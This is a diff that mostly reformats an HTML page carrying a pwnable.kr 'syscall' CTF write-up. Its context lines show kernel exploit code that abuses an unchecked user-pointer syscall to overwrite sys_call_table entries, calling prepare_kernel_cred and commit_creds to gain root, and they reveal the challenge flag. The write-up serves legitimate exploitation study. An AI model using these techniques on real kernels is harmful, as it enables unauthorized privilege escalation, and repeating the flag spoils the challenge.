@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta name="description" content="Detailed pwnable.kr syscall challenge writeup, covering kernel exploitation, arbitrary write primitives, credential structure manipulation, and privilege escalation techniques.">
     <link rel="icon" type="image/svg+xml" href="/favicon.svg">
@@ -28,10 +29,11 @@
         }
     </script>
 
-    <!-- Syntax highlighting -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
-    <script>hljs.highlightAll();</script>
+    <script>
+        hljs.highlightAll();
+    </script>
 
     <style>
         * {
@@ -48,9 +50,9 @@
         }
 
         .container {
-            max-width: 800px;
+            max-width: 1100px;
             margin: 0 auto;
-            padding: 60px 24px;
+            padding: 40px 24px;
         }
 
         header {
@@ -116,7 +118,7 @@
             font-family: 'Fira Code', monospace;
         }
 
-        .banner{
+        .banner {
             width: 100%;
             max-width: 100%;
             height: auto;
@@ -130,6 +132,7 @@
             padding: 40px;
             border-radius: 8px;
             border: 1px solid #e2e8f0;
+            width: 100%;
         }
 
         article h2 {
@@ -159,7 +162,8 @@
             color: #2d3748;
         }
 
-        article ul, article ol {
+        article ul,
+        article ol {
             margin-left: 24px;
             margin-bottom: 16px;
         }
@@ -195,6 +199,7 @@
             margin: 20px 0;
             overflow-x: auto;
             border: 1px solid #2d3748;
+            max-width: 100%;
         }
 
         pre code {
@@ -267,16 +272,19 @@
         }
     </style>
 
-    <!-- Google tag (gtag.js) -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-88239B8JH3"></script>
     <script>
         window.dataLayer = window.dataLayer || [];
-        function gtag(){dataLayer.push(arguments);}
+
+        function gtag() {
+            dataLayer.push(arguments);
+        }
         gtag('js', new Date());
 
         gtag('config', 'G-88239B8JH3');
     </script>
 </head>
+
 <body>
 
 <div class="container">
@@ -336,35 +344,35 @@ sh: can't access tty; job control turned off
 #include &lt;asm/page.h&gt;
 #include &lt;linux/syscalls.h&gt;
 
-#define SYS_CALL_TABLE		0x8000e348		// manually configure this address!!
-#define NR_SYS_UNUSED		223
+#define SYS_CALL_TABLE     0x8000e348    // manually configure this address!!
+#define NR_SYS_UNUSED      223
 
 //Pointers to re-mapped writable pages
 unsigned int** sct;
 
 asmlinkage long sys_upper(char *in, char* out){
-	int len = strlen(in);
-	int i;
-	for(i=0; i&lt;len; i++){
-		if(in[i]&gt;=0x61 &amp;&amp; in[i]&lt;=0x7a){
-			out[i] = in[i] - 0x20;
-		}
-		else{
-			out[i] = in[i];
-		}
-	}
-	return 0;
+    int len = strlen(in);
+    int i;
+    for(i=0; i&lt;len; i++){
+        if(in[i]&gt;=0x61 &amp;&amp; in[i]&lt;=0x7a){
+            out[i] = in[i] - 0x20;
+        }
+        else{
+            out[i] = in[i];
+        }
+    }
+    return 0;
 }
 
 static int __init initmodule(void ){
-	sct = (unsigned int**)SYS_CALL_TABLE;
-	sct[NR_SYS_UNUSED] = sys_upper;
-	printk("sys_upper(number : 223) is added\n");
-	return 0;
+    sct = (unsigned int**)SYS_CALL_TABLE;
+    sct[NR_SYS_UNUSED] = sys_upper;
+    printk("sys_upper(number : 223) is added\n");
+    return 0;
 }
 
 static void __exit exitmodule(void ){
-	return;
+    return;
 }
 
 module_init( initmodule );
@@ -386,12 +394,12 @@ module_exit( exitmodule );</code></pre>
         <pre><code class="language-c">int len = strlen(in);
 int i;
 for(i=0; i&lt;len; i++){
-	if(in[i]&gt;=0x61 &amp;&amp; in[i]&lt;=0x7a){
-		out[i] = in[i] - 0x20;
-	}
-	else{
-		out[i] = in[i];
-	}
+    if(in[i]&gt;=0x61 &amp;&amp; in[i]&lt;=0x7a){
+        out[i] = in[i] - 0x20;
+    }
+    else{
+        out[i] = in[i];
+    }
 }</code></pre>
 
         <p>I tested this with a small output buffer to trigger an overflow:</p>
@@ -444,18 +452,18 @@ Linux (none) 3.11.4 #13 SMP Fri Jul 11 00:48:31 PDT 2014 armv7l GNU/Linux</code>
 
         <pre><code class="language-c">SYSCALL_DEFINE2(upper, const char __user *, in, char __user *, out)
 {
-	pr_info("Hello from Yael's syscall");
-	int len = strlen(in);
-	int i;
-	for(i=0; i&lt;len; i++){
-			if(in[i]&gt;=0x61 &amp;&amp; in[i]&lt;=0x7a){
-					out[i] = in[i] - 0x20;
-			}
-			else{
-					out[i] = in[i];
-			}
-	}
-	return 0;
+    pr_info("Hello from Yael's syscall");
+    int len = strlen(in);
+    int i;
+    for(i=0; i&lt;len; i++){
+        if(in[i]&gt;=0x61 &amp;&amp; in[i]&lt;=0x7a){
+            out[i] = in[i] - 0x20;
+        }
+        else{
+            out[i] = in[i];
+        }
+    }
+    return 0;
 }</code></pre>
 
         <p>In <code>linux-5.4/include/linux/syscalls.h</code> I declared the syscall:</p>
@@ -509,24 +517,24 @@ continue</code></pre>
         <p>The <code>task_struct</code> is defined in the <code>include/linux/sched.h</code> <a href="https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/sched.h#L1027" target="_blank" rel="noreferrer">file</a> and contains the cred pointers:</p>
 
         <pre><code class="language-c">struct task_struct {
-  ...
-  /* process credentials */
-  const struct cred __rcu *real_cred; /* objective and real subjective task * credentials (COW) */
-  const struct cred __rcu *cred;	  /* effective (overridable) subjective task * credentials (COW) */
-  ...
+    ...
+    /* process credentials */
+    const struct cred __rcu *real_cred; /* objective and real subjective task * credentials (COW) */
+    const struct cred __rcu *cred;      /* effective (overridable) subjective task * credentials (COW) */
+    ...
 }</code></pre>
 
         <p>The <code>cred</code> structure is defined in <code>include/linux/cred.h</code> <a href="https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/cred.h#L102" target="_blank" rel="noreferrer">file</a>:</p>
 
         <pre><code class="language-c">struct cred {
-  ...
-  kuid_t		uid;		/* real UID of the task */
-  kgid_t		gid;		/* real GID of the task */
-  kuid_t		suid;		/* saved UID of the task */
-  kgid_t		sgid;		/* saved GID of the task */
-  kuid_t		euid;		/* effective UID of the task */
-  kgid_t		egid;		/* effective GID of the task */
-  ...
+    ...
+    kuid_t       uid;      /* real UID of the task */
+    kgid_t       gid;      /* real GID of the task */
+    kuid_t       suid;     /* saved UID of the task */
+    kgid_t       sgid;     /* saved GID of the task */
+    kuid_t       euid;     /* effective UID of the task */
+    kgid_t       egid;     /* effective GID of the task */
+    ...
 }</code></pre>
 
         <p>The kernel provides helper functions for credential management:</p>
@@ -550,23 +558,23 @@ commit_creds(cred); // or override_creds(cred);</code></pre>
         <p>I used this <code>.gdbinit</code> script to print the address that points to the creds.</p>
 
         <pre><code class="language-bash">define showcred
-  set $cpu = 0
-  set $off = __per_cpu_offset[$cpu]
-  set $task = *(struct task_struct **)((char *)&amp;current_task + $off)
+    set $cpu = 0
+    set $off = __per_cpu_offset[$cpu]
+    set $task = *(struct task_struct **)((char *)&amp;current_task + $off)
 
-  printf "cpu=%d  task=%p  pid=%d comm=%s\n", $cpu, $task, $task-&gt;pid, $task-&gt;comm
-  printf "&amp;task-&gt;cred = %p\n", &amp;($task-&gt;cred)
-  printf "&amp;task-&gt;real_cred = %p\n", &amp;($task-&gt;real_cred)
-  printf "task-&gt;cred  = %p\n", $task-&gt;cred
-  if $argc &gt; 0
-    p *(struct cred *)$task-&gt;cred
-  end
+    printf "cpu=%d  task=%p  pid=%d comm=%s\n", $cpu, $task, $task-&gt;pid, $task-&gt;comm
+    printf "&amp;task-&gt;cred = %p\n", &amp;($task-&gt;cred)
+    printf "&amp;task-&gt;real_cred = %p\n", &amp;($task-&gt;real_cred)
+    printf "task-&gt;cred  = %p\n", $task-&gt;cred
+    if $argc &gt; 0
+        p *(struct cred *)$task-&gt;cred
+    end
 end
 end
 
 document showcred
-  showcred        → prints task + cred + real_cred pointer only
-  showcred full   → also prints struct cred
+    showcred        → prints task + cred + real_cred pointer only
+    showcred full   → also prints struct cred
 end</code></pre>
 
         <p>Running this multiple times, I noticed something very useful: <strong>without KASLR, the credentials structure address was always the same!</strong></p>
@@ -610,7 +618,7 @@ int main(void) {
     unsigned char buf[8];
     memcpy(buf, &amp;init_cred, 8);
 
-	// from gdb: &amp;task-&gt;cred = 0xffff888006bb1278 (consistent across runs due to no KASLR)
+    // from gdb: &amp;task-&gt;cred = 0xffff888006bb1278 (consistent across runs due to no KASLR)
     uint64_t current_cred_ptr = 0xffff888006bb1278ULL;
     uint64_t real_cred_ptr = 0xffff888006bb1270ULL;
 
@@ -695,7 +703,7 @@ sys_call_table[6]
 
 
 int main(void) {
-	uint32_t sys_time = 0x80023530; // the address of sys_time from kallsyms
+    uint32_t sys_time = 0x80023530; // the address of sys_time from kallsyms
 
     long ret = syscall(__NR_sys_upper, &amp;sys_time, 0x8000e360); // 0x8000e360 is the address in syscall table of exit
     printf("syscall returned: %ld\n", ret);
@@ -723,7 +731,7 @@ syscall exit/time returned: 1768243724</code></pre>
         <pre><code class="language-c">int main(void) {
     uint32_t prepare = 0x8003f924; // the address of prepare_kernel_cred()
     long ret = syscall(__NR_sys_upper, &amp;prepare, 0x8000e7f8);
-	printf("syscall changing to prepare returned: %ld\n", ret);
+    printf("syscall changing to prepare returned: %ld\n", ret);
 
     uint32_t commit = 0x8003f56c; // the address of commit_creds(struct...)
     long ret2 = syscall(__NR_sys_upper, &amp;commit, 0x8000e7fc);
@@ -733,7 +741,7 @@ syscall exit/time returned: 1768243724</code></pre>
     printf("Creds: 0x%lx\n", (unsigned long)creds);
 
     long commit_ret = syscall(__NR_commit, (void *)creds); // commit creds
-	printf("syscall commit creds returned: %ld\n", commit_ret);
+    printf("syscall commit creds returned: %ld\n", commit_ret);
 
     printf("UID: %d\n", getuid());
     printf("EUID: %d\n", geteuid());
@@ -747,9 +755,9 @@ syscall exit/time returned: 1768243724</code></pre>
         <p>I then realized that the address of <code>commit_creds</code> contains the byte <code>0x6c</code>, which is the lowercase ASCII character <code>l</code>. This means that when passing the <code>commit_creds</code> pointer to <code>upper()</code>, the address is modified, resulting in a different address and making it impossible to call <code>commit_creds</code> this way:</p>
 
         <pre><code>Original commit_creds:      0x8003f56c
-							        ^^-- 0x6c = 'l' (ASCII 108)
+                              ^^-- 0x6c = 'l' (ASCII 108)
 After sys_upper:            0x8003f54c
-							        ^^-- 0x4c = 'L' (ASCII 76)</code></pre>
+                              ^^-- 0x4c = 'L' (ASCII 76)</code></pre>
 
         <p>I tried replacing it with the byte <code>0x60</code>, which is outside the lowercase ASCII range. Since it is the least significant byte, I hoped it would land on some NOP padding and eventually reach the <code>commit_creds</code> function. That didn't work either.</p>
 
@@ -853,5 +861,7 @@ Must_san1tize_Us3r_p0int3r</code></pre>
         </ul>
     </article>
 </div>
+
 </body>
+
 </html>
